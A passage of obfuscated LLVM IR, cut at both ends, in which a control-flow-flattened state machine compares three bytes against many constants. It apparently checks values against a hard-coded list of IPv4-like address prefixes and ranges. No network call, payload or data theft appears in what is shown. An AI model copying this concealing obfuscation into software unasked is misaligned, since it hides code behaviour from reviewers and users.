  br label %loopEnd

; <label>:1338:                                   ; preds = %loopEntry
  %1339 = load i8, i8* %3, align 1
  %1340 = zext i8 %1339 to i32
  %1341 = icmp eq i32 %1340, 47
  %1342 = select i1 %1341, i32 -2060805917, i32 50097348
  store i32 %1342, i32* %switchVar
  br label %loopEnd

; <label>:1343:                                   ; preds = %loopEntry
  %1344 = load i8, i8* %4, align 1
  %1345 = zext i8 %1344 to i32
  %1346 = icmp sge i32 %1345, 10
  %1347 = select i1 %1346, i32 -578267699, i32 50097348
  store i32 %1347, i32* %switchVar
  br label %loopEnd

; <label>:1348:                                   ; preds = %loopEntry
  %1349 = load i8, i8* %4, align 1
  %1350 = zext i8 %1349 to i32
  %1351 = icmp slt i32 %1350, 11
  %1352 = select i1 %1351, i32 1839754081, i32 50097348
  store i32 %1352, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1353:                                   ; preds = %loopEntry
  %1354 = load i8, i8* %2, align 1
  %1355 = zext i8 %1354 to i32
  %1356 = icmp eq i32 %1355, 174
  %1357 = select i1 %1356, i32 -1569961814, i32 -728707659
  store i32 %1357, i32* %switchVar
  br label %loopEnd

; <label>:1358:                                   ; preds = %loopEntry
  %1359 = load i8, i8* %3, align 1
  %1360 = zext i8 %1359 to i32
  %1361 = icmp eq i32 %1360, 138
  %1362 = select i1 %1361, i32 -672708958, i32 -728707659
  store i32 %1362, i32* %switchVar
  br label %loopEnd

; <label>:1363:                                   ; preds = %loopEntry
  %1364 = load i8, i8* %4, align 1
  %1365 = zext i8 %1364 to i32
  %1366 = icmp sge i32 %1365, 1
  %1367 = select i1 %1366, i32 -1344658420, i32 -728707659
  store i32 %1367, i32* %switchVar
  br label %loopEnd

; <label>:1368:                                   ; preds = %loopEntry
  %1369 = load i8, i8* %4, align 1
  %1370 = zext i8 %1369 to i32
  %1371 = icmp slt i32 %1370, 127
  %1372 = select i1 %1371, i32 1839754081, i32 -728707659
  store i32 %1372, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1373:                                   ; preds = %loopEntry
  %1374 = load i8, i8* %2, align 1
  %1375 = zext i8 %1374 to i32
  %1376 = icmp eq i32 %1375, 192
  %1377 = select i1 %1376, i32 1692488665, i32 -197855166
  store i32 %1377, i32* %switchVar
  br label %loopEnd

; <label>:1378:                                   ; preds = %loopEntry
  %1379 = load i8, i8* %3, align 1
  %1380 = zext i8 %1379 to i32
  %1381 = icmp eq i32 %1380, 241
  %1382 = select i1 %1381, i32 1712284131, i32 -197855166
  store i32 %1382, i32* %switchVar
  br label %loopEnd

; <label>:1383:                                   ; preds = %loopEntry
  %1384 = load i8, i8* %4, align 1
  %1385 = zext i8 %1384 to i32
  %1386 = icmp sge i32 %1385, 128
  %1387 = select i1 %1386, i32 -1619507099, i32 -197855166
  store i32 %1387, i32* %switchVar
  br label %loopEnd

; <label>:1388:                                   ; preds = %loopEntry
  %1389 = load i8, i8* %4, align 1
  %1390 = zext i8 %1389 to i32
  %1391 = icmp slt i32 %1390, 255
  %1392 = select i1 %1391, i32 1839754081, i32 -197855166
  store i32 %1392, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1393:                                   ; preds = %loopEntry
  %1394 = load i8, i8* %2, align 1
  %1395 = zext i8 %1394 to i32
  %1396 = icmp eq i32 %1395, 198
  %1397 = select i1 %1396, i32 -1038997447, i32 1772528185
  store i32 %1397, i32* %switchVar
  br label %loopEnd

; <label>:1398:                                   ; preds = %loopEntry
  %1399 = load i8, i8* %3, align 1
  %1400 = zext i8 %1399 to i32
  %1401 = icmp eq i32 %1400, 199
  %1402 = select i1 %1401, i32 402265505, i32 1772528185
  store i32 %1402, i32* %switchVar
  br label %loopEnd

; <label>:1403:                                   ; preds = %loopEntry
  %1404 = load i8, i8* %4, align 1
  %1405 = zext i8 %1404 to i32
  %1406 = icmp sge i32 %1405, 64
  %1407 = select i1 %1406, i32 1644728918, i32 1772528185
  store i32 %1407, i32* %switchVar
  br label %loopEnd

; <label>:1408:                                   ; preds = %loopEntry
  %1409 = load i8, i8* %4, align 1
  %1410 = zext i8 %1409 to i32
  %1411 = icmp slt i32 %1410, 127
  %1412 = select i1 %1411, i32 1839754081, i32 1772528185
  store i32 %1412, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1413:                                   ; preds = %loopEntry
  %1414 = load i8, i8* %2, align 1
  %1415 = zext i8 %1414 to i32
  %1416 = icmp eq i32 %1415, 198
  %1417 = select i1 %1416, i32 232623245, i32 -1802337066
  store i32 %1417, i32* %switchVar
  br label %loopEnd

; <label>:1418:                                   ; preds = %loopEntry
  %1419 = load i8, i8* %3, align 1
  %1420 = zext i8 %1419 to i32
  %1421 = icmp eq i32 %1420, 211
  %1422 = select i1 %1421, i32 -379020917, i32 -1802337066
  store i32 %1422, i32* %switchVar
  br label %loopEnd

; <label>:1423:                                   ; preds = %loopEntry
  %1424 = load i8, i8* %4, align 1
  %1425 = zext i8 %1424 to i32
  %1426 = icmp sge i32 %1425, 96
  %1427 = select i1 %1426, i32 1490519949, i32 -1802337066
  store i32 %1427, i32* %switchVar
  br label %loopEnd

; <label>:1428:                                   ; preds = %loopEntry
  %1429 = load i8, i8* %4, align 1
  %1430 = zext i8 %1429 to i32
  %1431 = icmp slt i32 %1430, 127
  %1432 = select i1 %1431, i32 1839754081, i32 -1802337066
  store i32 %1432, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1433:                                   ; preds = %loopEntry
  %1434 = load i8, i8* %2, align 1
  %1435 = zext i8 %1434 to i32
  %1436 = icmp eq i32 %1435, 207
  %1437 = select i1 %1436, i32 1315605040, i32 1848831446
  store i32 %1437, i32* %switchVar
  br label %loopEnd

; <label>:1438:                                   ; preds = %loopEntry
  %1439 = load i8, i8* %3, align 1
  %1440 = zext i8 %1439 to i32
  %1441 = icmp eq i32 %1440, 154
  %1442 = select i1 %1441, i32 1589444164, i32 1848831446
  store i32 %1442, i32* %switchVar
  br label %loopEnd

; <label>:1443:                                   ; preds = %loopEntry
  %1444 = load i8, i8* %4, align 1
  %1445 = zext i8 %1444 to i32
  %1446 = icmp sge i32 %1445, 192
  %1447 = select i1 %1446, i32 -1380442122, i32 1848831446
  store i32 %1447, i32* %switchVar
  br label %loopEnd

; <label>:1448:                                   ; preds = %loopEntry
  %1449 = load i8, i8* %4, align 1
  %1450 = zext i8 %1449 to i32
  %1451 = icmp slt i32 %1450, 255
  %1452 = select i1 %1451, i32 1839754081, i32 1848831446
  store i32 %1452, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1453:                                   ; preds = %loopEntry
  %1454 = load i8, i8* %2, align 1
  %1455 = zext i8 %1454 to i32
  %1456 = icmp eq i32 %1455, 37
  %1457 = select i1 %1456, i32 1938040508, i32 -1627306357
  store i32 %1457, i32* %switchVar
  br label %loopEnd

; <label>:1458:                                   ; preds = %loopEntry
  %1459 = load i8, i8* %3, align 1
  %1460 = zext i8 %1459 to i32
  %1461 = icmp eq i32 %1460, 139
  %1462 = select i1 %1461, i32 84927246, i32 -1627306357
  store i32 %1462, i32* %switchVar
  br label %loopEnd

; <label>:1463:                                   ; preds = %loopEntry
  %1464 = load i8, i8* %4, align 1
  %1465 = zext i8 %1464 to i32
  %1466 = icmp sge i32 %1465, 1
  %1467 = select i1 %1466, i32 -309437642, i32 -1627306357
  store i32 %1467, i32* %switchVar
  br label %loopEnd

; <label>:1468:                                   ; preds = %loopEntry
  %1469 = load i8, i8* %4, align 1
  %1470 = zext i8 %1469 to i32
  %1471 = icmp slt i32 %1470, 31
  %1472 = select i1 %1471, i32 1839754081, i32 -1627306357
  store i32 %1472, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1473:                                   ; preds = %loopEntry
  %1474 = load i8, i8* %2, align 1
  %1475 = zext i8 %1474 to i32
  %1476 = icmp eq i32 %1475, 67
  %1477 = select i1 %1476, i32 1405009187, i32 -1184935427
  store i32 %1477, i32* %switchVar
  br label %loopEnd

; <label>:1478:                                   ; preds = %loopEntry
  %1479 = load i8, i8* %3, align 1
  %1480 = zext i8 %1479 to i32
  %1481 = icmp eq i32 %1480, 207
  %1482 = select i1 %1481, i32 -1577907671, i32 -1184935427
  store i32 %1482, i32* %switchVar
  br label %loopEnd

; <label>:1483:                                   ; preds = %loopEntry
  %1484 = load i8, i8* %4, align 1
  %1485 = zext i8 %1484 to i32
  %1486 = icmp sge i32 %1485, 64
  %1487 = select i1 %1486, i32 1360763266, i32 -1184935427
  store i32 %1487, i32* %switchVar
  br label %loopEnd

; <label>:1488:                                   ; preds = %loopEntry
  %1489 = load i8, i8* %4, align 1
  %1490 = zext i8 %1489 to i32
  %1491 = icmp slt i32 %1490, 95
  %1492 = select i1 %1491, i32 1839754081, i32 -1184935427
  store i32 %1492, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1493:                                   ; preds = %loopEntry
  %1494 = load i8, i8* %2, align 1
  %1495 = zext i8 %1494 to i32
  %1496 = icmp eq i32 %1495, 67
  %1497 = select i1 %1496, i32 -387423603, i32 -576196374
  store i32 %1497, i32* %switchVar
  br label %loopEnd

; <label>:1498:                                   ; preds = %loopEntry
  %1499 = load i8, i8* %3, align 1
  %1500 = zext i8 %1499 to i32
  %1501 = icmp eq i32 %1500, 205
  %1502 = select i1 %1501, i32 -1974462385, i32 -576196374
  store i32 %1502, i32* %switchVar
  br label %loopEnd

; <label>:1503:                                   ; preds = %loopEntry
  %1504 = load i8, i8* %4, align 1
  %1505 = zext i8 %1504 to i32
  %1506 = icmp sge i32 %1505, 128
  %1507 = select i1 %1506, i32 -1796405912, i32 -576196374
  store i32 %1507, i32* %switchVar
  br label %loopEnd

; <label>:1508:                                   ; preds = %loopEntry
  %1509 = load i8, i8* %4, align 1
  %1510 = zext i8 %1509 to i32
  %1511 = icmp slt i32 %1510, 191
  %1512 = select i1 %1511, i32 1839754081, i32 -576196374
  store i32 %1512, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1513:                                   ; preds = %loopEntry
  %1514 = load i8, i8* %2, align 1
  %1515 = zext i8 %1514 to i32
  %1516 = icmp eq i32 %1515, 80
  %1517 = select i1 %1516, i32 2072412937, i32 -939032143
  store i32 %1517, i32* %switchVar
  br label %loopEnd

; <label>:1518:                                   ; preds = %loopEntry
  %1519 = load i8, i8* %3, align 1
  %1520 = zext i8 %1519 to i32
  %1521 = icmp eq i32 %1520, 240
  %1522 = select i1 %1521, i32 -191827386, i32 -939032143
  store i32 %1522, i32* %switchVar
  br label %loopEnd

; <label>:1523:                                   ; preds = %loopEntry
  %1524 = load i8, i8* %4, align 1
  %1525 = zext i8 %1524 to i32
  %1526 = icmp sge i32 %1525, 128
  %1527 = select i1 %1526, i32 -1642497096, i32 -939032143
  store i32 %1527, i32* %switchVar
  br label %loopEnd

; <label>:1528:                                   ; preds = %loopEntry
  %1529 = load i8, i8* %4, align 1
  %1530 = zext i8 %1529 to i32
  %1531 = icmp slt i32 %1530, 143
  %1532 = select i1 %1531, i32 1839754081, i32 -939032143
  store i32 %1532, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1533:                                   ; preds = %loopEntry
  %1534 = load i8, i8* %2, align 1
  %1535 = zext i8 %1534 to i32
  %1536 = icmp eq i32 %1535, 82
  %1537 = select i1 %1536, i32 1084226078, i32 -496360396
  store i32 %1537, i32* %switchVar
  br label %loopEnd

; <label>:1538:                                   ; preds = %loopEntry
  %1539 = load i8, i8* %3, align 1
  %1540 = zext i8 %1539 to i32
  %1541 = icmp eq i32 %1540, 196
  %1542 = select i1 %1541, i32 -318218629, i32 -496360396
  store i32 %1542, i32* %switchVar
  br label %loopEnd

; <label>:1543:                                   ; preds = %loopEntry
  %1544 = load i8, i8* %4, align 1
  %1545 = zext i8 %1544 to i32
  %1546 = icmp sge i32 %1545, 1
  %1547 = select i1 %1546, i32 -282062130, i32 -496360396
  store i32 %1547, i32* %switchVar
  br label %loopEnd

; <label>:1548:                                   ; preds = %loopEntry
  %1549 = load i8, i8* %4, align 1
  %1550 = zext i8 %1549 to i32
  %1551 = icmp slt i32 %1550, 15
  %1552 = select i1 %1551, i32 1839754081, i32 -496360396
  store i32 %1552, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1553:                                   ; preds = %loopEntry
  %1554 = load i8, i8* %2, align 1
  %1555 = zext i8 %1554 to i32
  %1556 = icmp eq i32 %1555, 95
  %1557 = select i1 %1556, i32 -1844917019, i32 2025548676
  store i32 %1557, i32* %switchVar
  br label %loopEnd

; <label>:1558:                                   ; preds = %loopEntry
  %1559 = load i8, i8* %3, align 1
  %1560 = zext i8 %1559 to i32
  %1561 = icmp eq i32 %1560, 85
  %1562 = select i1 %1561, i32 -1179854280, i32 2025548676
  store i32 %1562, i32* %switchVar
  br label %loopEnd

; <label>:1563:                                   ; preds = %loopEntry
  %1564 = load i8, i8* %4, align 1
  %1565 = zext i8 %1564 to i32
  %1566 = icmp sge i32 %1565, 8
  %1567 = select i1 %1566, i32 -1341792502, i32 2025548676
  store i32 %1567, i32* %switchVar
  br label %loopEnd

; <label>:1568:                                   ; preds = %loopEntry
  %1569 = load i8, i8* %4, align 1
  %1570 = zext i8 %1569 to i32
  %1571 = icmp slt i32 %1570, 63
  %1572 = select i1 %1571, i32 1839754081, i32 2025548676
  store i32 %1572, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1573:                                   ; preds = %loopEntry
  %1574 = load i8, i8* %2, align 1
  %1575 = zext i8 %1574 to i32
  %1576 = icmp eq i32 %1575, 64
  %1577 = select i1 %1576, i32 1914461472, i32 510118745
  store i32 %1577, i32* %switchVar
  br label %loopEnd

; <label>:1578:                                   ; preds = %loopEntry
  %1579 = load i8, i8* %3, align 1
  %1580 = zext i8 %1579 to i32
  %1581 = icmp eq i32 %1580, 237
  %1582 = select i1 %1581, i32 1064812132, i32 510118745
  store i32 %1582, i32* %switchVar
  br label %loopEnd

; <label>:1583:                                   ; preds = %loopEntry
  %1584 = load i8, i8* %4, align 1
  %1585 = zext i8 %1584 to i32
  %1586 = icmp sge i32 %1585, 32
  %1587 = select i1 %1586, i32 -1219874632, i32 510118745
  store i32 %1587, i32* %switchVar
  br label %loopEnd

; <label>:1588:                                   ; preds = %loopEntry
  %1589 = load i8, i8* %4, align 1
  %1590 = zext i8 %1589 to i32
  %1591 = icmp slt i32 %1590, 43
  %1592 = select i1 %1591, i32 1839754081, i32 510118745
  store i32 %1592, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1593:                                   ; preds = %loopEntry
  %1594 = load i8, i8* %2, align 1
  %1595 = zext i8 %1594 to i32
  %1596 = icmp eq i32 %1595, 185
  %1597 = select i1 %1596, i32 1670510978, i32 331217133
  store i32 %1597, i32* %switchVar
  br label %loopEnd

; <label>:1598:                                   ; preds = %loopEntry
  %1599 = load i8, i8* %3, align 1
  %1600 = zext i8 %1599 to i32
  %1601 = icmp eq i32 %1600, 92
  %1602 = select i1 %1601, i32 -1292701789, i32 331217133
  store i32 %1602, i32* %switchVar
  br label %loopEnd

; <label>:1603:                                   ; preds = %loopEntry
  %1604 = load i8, i8* %4, align 1
  %1605 = zext i8 %1604 to i32
  %1606 = icmp sge i32 %1605, 220
  %1607 = select i1 %1606, i32 -593296518, i32 331217133
  store i32 %1607, i32* %switchVar
  br label %loopEnd

; <label>:1608:                                   ; preds = %loopEntry
  %1609 = load i8, i8* %4, align 1
  %1610 = zext i8 %1609 to i32
  %1611 = icmp slt i32 %1610, 223
  %1612 = select i1 %1611, i32 1839754081, i32 331217133
  store i32 %1612, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1613:                                   ; preds = %loopEntry
  %1614 = load i8, i8* %2, align 1
  %1615 = zext i8 %1614 to i32
  %1616 = icmp eq i32 %1615, 104
  %1617 = select i1 %1616, i32 1975731762, i32 570697171
  store i32 %1617, i32* %switchVar
  br label %loopEnd

; <label>:1618:                                   ; preds = %loopEntry
  %1619 = load i8, i8* %3, align 1
  %1620 = zext i8 %1619 to i32
  %1621 = icmp eq i32 %1620, 238
  %1622 = select i1 %1621, i32 -606819938, i32 570697171
  store i32 %1622, i32* %switchVar
  br label %loopEnd

; <label>:1623:                                   ; preds = %loopEntry
  %1624 = load i8, i8* %4, align 1
  %1625 = zext i8 %1624 to i32
  %1626 = icmp sge i32 %1625, 128
  %1627 = select i1 %1626, i32 239720598, i32 570697171
  store i32 %1627, i32* %switchVar
  br label %loopEnd

; <label>:1628:                                   ; preds = %loopEntry
  %1629 = load i8, i8* %4, align 1
  %1630 = zext i8 %1629 to i32
  %1631 = icmp slt i32 %1630, 191
  %1632 = select i1 %1631, i32 1839754081, i32 570697171
  store i32 %1632, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1633:                                   ; preds = %loopEntry
  %1634 = load i8, i8* %2, align 1
  %1635 = zext i8 %1634 to i32
  %1636 = icmp eq i32 %1635, 209
  %1637 = select i1 %1636, i32 367562169, i32 -1481836456
  store i32 %1637, i32* %switchVar
  br label %loopEnd

; <label>:1638:                                   ; preds = %loopEntry
  %1639 = load i8, i8* %3, align 1
  %1640 = zext i8 %1639 to i32
  %1641 = icmp eq i32 %1640, 222
  %1642 = select i1 %1641, i32 958136897, i32 -1481836456
  store i32 %1642, i32* %switchVar
  br label %loopEnd

; <label>:1643:                                   ; preds = %loopEntry
  %1644 = load i8, i8* %4, align 1
  %1645 = zext i8 %1644 to i32
  %1646 = icmp sge i32 %1645, 1
  %1647 = select i1 %1646, i32 -961310531, i32 -1481836456
  store i32 %1647, i32* %switchVar
  br label %loopEnd

; <label>:1648:                                   ; preds = %loopEntry
  %1649 = load i8, i8* %4, align 1
  %1650 = zext i8 %1649 to i32
  %1651 = icmp slt i32 %1650, 31
  %1652 = select i1 %1651, i32 1839754081, i32 -1481836456
  store i32 %1652, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1653:                                   ; preds = %loopEntry
  %1654 = load i8, i8* %2, align 1
  %1655 = zext i8 %1654 to i32
  %1656 = icmp eq i32 %1655, 208
  %1657 = select i1 %1656, i32 1479944633, i32 -537221729
  store i32 %1657, i32* %switchVar
  br label %loopEnd

; <label>:1658:                                   ; preds = %loopEntry
  %1659 = load i8, i8* %3, align 1
  %1660 = zext i8 %1659 to i32
  %1661 = icmp eq i32 %1660, 167
  %1662 = select i1 %1661, i32 -758972590, i32 -537221729
  store i32 %1662, i32* %switchVar
  br label %loopEnd

; <label>:1663:                                   ; preds = %loopEntry
  %1664 = load i8, i8* %4, align 1
  %1665 = zext i8 %1664 to i32
  %1666 = icmp sge i32 %1665, 232
  %1667 = select i1 %1666, i32 2094583289, i32 -537221729
  store i32 %1667, i32* %switchVar
  br label %loopEnd

; <label>:1668:                                   ; preds = %loopEntry
  %1669 = load i8, i8* %4, align 1
  %1670 = zext i8 %1669 to i32
  %1671 = icmp slt i32 %1670, 252
  %1672 = select i1 %1671, i32 1839754081, i32 -537221729
  store i32 %1672, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1673:                                   ; preds = %loopEntry
  %1674 = load i8, i8* %2, align 1
  %1675 = zext i8 %1674 to i32
  %1676 = icmp eq i32 %1675, 66
  %1677 = select i1 %1676, i32 1584496523, i32 352848903
  store i32 %1677, i32* %switchVar
  br label %loopEnd

; <label>:1678:                                   ; preds = %loopEntry
  %1679 = load i8, i8* %3, align 1
  %1680 = zext i8 %1679 to i32
  %1681 = icmp eq i32 %1680, 55
  %1682 = select i1 %1681, i32 33835649, i32 352848903
  store i32 %1682, i32* %switchVar
  br label %loopEnd

; <label>:1683:                                   ; preds = %loopEntry
  %1684 = load i8, i8* %4, align 1
  %1685 = zext i8 %1684 to i32
  %1686 = icmp sge i32 %1685, 128
  %1687 = select i1 %1686, i32 307247806, i32 352848903
  store i32 %1687, i32* %switchVar
  br label %loopEnd

; <label>:1688:                                   ; preds = %loopEntry
  %1689 = load i8, i8* %4, align 1
  %1690 = zext i8 %1689 to i32
  %1691 = icmp slt i32 %1690, 159
  %1692 = select i1 %1691, i32 1839754081, i32 352848903
  store i32 %1692, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1693:                                   ; preds = %loopEntry
  %1694 = load i8, i8* %2, align 1
  %1695 = zext i8 %1694 to i32
  %1696 = icmp eq i32 %1695, 45
  %1697 = select i1 %1696, i32 173500211, i32 277298684
  store i32 %1697, i32* %switchVar
  br label %loopEnd

; <label>:1698:                                   ; preds = %loopEntry
  %1699 = load i8, i8* %3, align 1
  %1700 = zext i8 %1699 to i32
  %1701 = icmp eq i32 %1700, 63
  %1702 = select i1 %1701, i32 -1844653426, i32 277298684
  store i32 %1702, i32* %switchVar
  br label %loopEnd

; <label>:1703:                                   ; preds = %loopEntry
  %1704 = load i8, i8* %4, align 1
  %1705 = zext i8 %1704 to i32
  %1706 = icmp sge i32 %1705, 1
  %1707 = select i1 %1706, i32 1157124307, i32 277298684
  store i32 %1707, i32* %switchVar
  br label %loopEnd

; <label>:1708:                                   ; preds = %loopEntry
  %1709 = load i8, i8* %4, align 1
  %1710 = zext i8 %1709 to i32
  %1711 = icmp slt i32 %1710, 127
  %1712 = select i1 %1711, i32 1839754081, i32 277298684
  store i32 %1712, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1713:                                   ; preds = %loopEntry
  %1714 = load i8, i8* %2, align 1
  %1715 = zext i8 %1714 to i32
  %1716 = icmp eq i32 %1715, 216
  %1717 = select i1 %1716, i32 -998016767, i32 301874441
  store i32 %1717, i32* %switchVar
  br label %loopEnd

; <label>:1718:                                   ; preds = %loopEntry
  %1719 = load i8, i8* %3, align 1
  %1720 = zext i8 %1719 to i32
  %1721 = icmp eq i32 %1720, 237
  %1722 = select i1 %1721, i32 -662589339, i32 301874441
  store i32 %1722, i32* %switchVar
  br label %loopEnd

; <label>:1723:                                   ; preds = %loopEntry
  %1724 = load i8, i8* %4, align 1
  %1725 = zext i8 %1724 to i32
  %1726 = icmp sge i32 %1725, 128
  %1727 = select i1 %1726, i32 562776126, i32 301874441
  store i32 %1727, i32* %switchVar
  br label %loopEnd

; <label>:1728:                                   ; preds = %loopEntry
  %1729 = load i8, i8* %4, align 1
  %1730 = zext i8 %1729 to i32
  %1731 = icmp slt i32 %1730, 159
  %1732 = select i1 %1731, i32 1839754081, i32 301874441
  store i32 %1732, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1733:                                   ; preds = %loopEntry
  %1734 = load i8, i8* %2, align 1
  %1735 = zext i8 %1734 to i32
  %1736 = icmp eq i32 %1735, 108
  %1737 = select i1 %1736, i32 -1671746300, i32 412931321
  store i32 %1737, i32* %switchVar
  br label %loopEnd

; <label>:1738:                                   ; preds = %loopEntry
  %1739 = load i8, i8* %3, align 1
  %1740 = zext i8 %1739 to i32
  %1741 = icmp eq i32 %1740, 61
  %1742 = select i1 %1741, i32 1839754081, i32 412931321
  store i32 %1742, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1743:                                   ; preds = %loopEntry
  %1744 = load i8, i8* %2, align 1
  %1745 = zext i8 %1744 to i32
  %1746 = icmp eq i32 %1745, 45
  %1747 = select i1 %1746, i32 -1658639404, i32 1203166537
  store i32 %1747, i32* %switchVar
  br label %loopEnd

; <label>:1748:                                   ; preds = %loopEntry
  %1749 = load i8, i8* %3, align 1
  %1750 = zext i8 %1749 to i32
  %1751 = icmp eq i32 %1750, 76
  %1752 = select i1 %1751, i32 1839754081, i32 1203166537
  store i32 %1752, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1753:                                   ; preds = %loopEntry
  %1754 = load i8, i8* %2, align 1
  %1755 = zext i8 %1754 to i32
  %1756 = icmp eq i32 %1755, 185
  %1757 = select i1 %1756, i32 -856922715, i32 -67886789
  store i32 %1757, i32* %switchVar
  br label %loopEnd

; <label>:1758:                                   ; preds = %loopEntry
  %1759 = load i8, i8* %3, align 1
  %1760 = zext i8 %1759 to i32
  %1761 = icmp eq i32 %1760, 11
  %1762 = select i1 %1761, i32 1290463508, i32 -67886789
  store i32 %1762, i32* %switchVar
  br label %loopEnd

; <label>:1763:                                   ; preds = %loopEntry
  %1764 = load i8, i8* %4, align 1
  %1765 = zext i8 %1764 to i32
  %1766 = icmp sge i32 %1765, 144
  %1767 = select i1 %1766, i32 -439175329, i32 -67886789
  store i32 %1767, i32* %switchVar
  br label %loopEnd

; <label>:1768:                                   ; preds = %loopEntry
  %1769 = load i8, i8* %4, align 1
  %1770 = zext i8 %1769 to i32
  %1771 = icmp slt i32 %1770, 148
  %1772 = select i1 %1771, i32 1839754081, i32 -67886789
  store i32 %1772, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1773:                                   ; preds = %loopEntry
  %1774 = load i8, i8* %2, align 1
  %1775 = zext i8 %1774 to i32
  %1776 = icmp eq i32 %1775, 185
  %1777 = select i1 %1776, i32 -990833061, i32 219447437
  store i32 %1777, i32* %switchVar
  br label %loopEnd

; <label>:1778:                                   ; preds = %loopEntry
  %1779 = load i8, i8* %3, align 1
  %1780 = zext i8 %1779 to i32
  %1781 = icmp eq i32 %1780, 56
  %1782 = select i1 %1781, i32 1735819643, i32 219447437
  store i32 %1782, i32* %switchVar
  br label %loopEnd

; <label>:1783:                                   ; preds = %loopEntry
  %1784 = load i8, i8* %4, align 1
  %1785 = zext i8 %1784 to i32
  %1786 = icmp sge i32 %1785, 21
  %1787 = select i1 %1786, i32 -1055296893, i32 219447437
  store i32 %1787, i32* %switchVar
  br label %loopEnd

; <label>:1788:                                   ; preds = %loopEntry
  %1789 = load i8, i8* %4, align 1
  %1790 = zext i8 %1789 to i32
  %1791 = icmp slt i32 %1790, 23
  %1792 = select i1 %1791, i32 1839754081, i32 219447437
  store i32 %1792, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1793:                                   ; preds = %loopEntry
  %1794 = load i8, i8* %2, align 1
  %1795 = zext i8 %1794 to i32
  %1796 = icmp eq i32 %1795, 185
  %1797 = select i1 %1796, i32 -729833917, i32 1296392233
  store i32 %1797, i32* %switchVar
  br label %loopEnd

; <label>:1798:                                   ; preds = %loopEntry
  %1799 = load i8, i8* %3, align 1
  %1800 = zext i8 %1799 to i32
  %1801 = icmp eq i32 %1800, 61
  %1802 = select i1 %1801, i32 -1195472046, i32 1296392233
  store i32 %1802, i32* %switchVar
  br label %loopEnd

; <label>:1803:                                   ; preds = %loopEntry
  %1804 = load i8, i8* %4, align 1
  %1805 = zext i8 %1804 to i32
  %1806 = icmp sge i32 %1805, 136
  %1807 = select i1 %1806, i32 -372664331, i32 1296392233
  store i32 %1807, i32* %switchVar
  br label %loopEnd

; <label>:1808:                                   ; preds = %loopEntry
  %1809 = load i8, i8* %4, align 1
  %1810 = zext i8 %1809 to i32
  %1811 = icmp slt i32 %1810, 139
  %1812 = select i1 %1811, i32 1839754081, i32 1296392233
  store i32 %1812, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1813:                                   ; preds = %loopEntry
  %1814 = load i8, i8* %2, align 1
  %1815 = zext i8 %1814 to i32
  %1816 = icmp eq i32 %1815, 185
  %1817 = select i1 %1816, i32 882788156, i32 444521258
  store i32 %1817, i32* %switchVar
  br label %loopEnd

; <label>:1818:                                   ; preds = %loopEntry
  %1819 = load i8, i8* %3, align 1
  %1820 = zext i8 %1819 to i32
  %1821 = icmp eq i32 %1820, 62
  %1822 = select i1 %1821, i32 -1949144523, i32 444521258
  store i32 %1822, i32* %switchVar
  br label %loopEnd

; <label>:1823:                                   ; preds = %loopEntry
  %1824 = load i8, i8* %4, align 1
  %1825 = zext i8 %1824 to i32
  %1826 = icmp sge i32 %1825, 187
  %1827 = select i1 %1826, i32 -432544531, i32 444521258
  store i32 %1827, i32* %switchVar
  br label %loopEnd

; <label>:1828:                                   ; preds = %loopEntry
  %1829 = load i8, i8* %4, align 1
  %1830 = zext i8 %1829 to i32
  %1831 = icmp slt i32 %1830, 191
  %1832 = select i1 %1831, i32 1839754081, i32 444521258
  store i32 %1832, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1833:                                   ; preds = %loopEntry
  %1834 = load i8, i8* %2, align 1
  %1835 = zext i8 %1834 to i32
  %1836 = icmp eq i32 %1835, 66
  %1837 = select i1 %1836, i32 1080638488, i32 -21224446
  store i32 %1837, i32* %switchVar
  br label %loopEnd

; <label>:1838:                                   ; preds = %loopEntry
  %1839 = load i8, i8* %3, align 1
  %1840 = zext i8 %1839 to i32
  %1841 = icmp eq i32 %1840, 150
  %1842 = select i1 %1841, i32 -1467942874, i32 -21224446
  store i32 %1842, i32* %switchVar
  br label %loopEnd

; <label>:1843:                                   ; preds = %loopEntry
  %1844 = load i8, i8* %4, align 1
  %1845 = zext i8 %1844 to i32
  %1846 = icmp sge i32 %1845, 120
  %1847 = select i1 %1846, i32 1118046312, i32 -21224446
  store i32 %1847, i32* %switchVar
  br label %loopEnd

; <label>:1848:                                   ; preds = %loopEntry
  %1849 = load i8, i8* %4, align 1
  %1850 = zext i8 %1849 to i32
  %1851 = icmp slt i32 %1850, 215
  %1852 = select i1 %1851, i32 1839754081, i32 -21224446
  store i32 %1852, i32* %switchVar
  store i1 true, i1* %.reg2mem
